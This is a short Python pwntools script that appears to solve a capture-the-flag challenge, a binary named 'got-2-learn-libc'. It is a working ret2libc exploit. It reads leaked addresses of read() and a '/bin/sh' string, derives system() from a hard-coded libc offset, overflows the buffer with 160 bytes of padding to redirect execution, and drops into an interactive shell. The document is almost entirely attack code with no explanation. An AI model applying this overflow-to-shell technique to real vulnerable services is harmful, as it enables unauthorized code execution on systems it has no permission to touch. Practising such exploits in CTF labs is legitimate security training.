#!/usr/bin/env python

from pwn import *

padding = "A"*160


r = process("/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln")

r.recvuntil('read: ')
read_address = r.recvuntil('\n')
print "read address :  " + read_address
r.recvuntil('useful_string: ')
useful_string = r.recvuntil('\n')
print "/bin/sh string : " + useful_string

r.recvuntil('Enter a string:\n')

system_address = hex(int(read_address,16)-0x99a10)
print "system address : " + system_address


r.sendline(padding + p32(int(system_address,16)) + "AAAA" + p32(int(useful_string,16)))

print r.recv()
r.interactive()

#r.close()
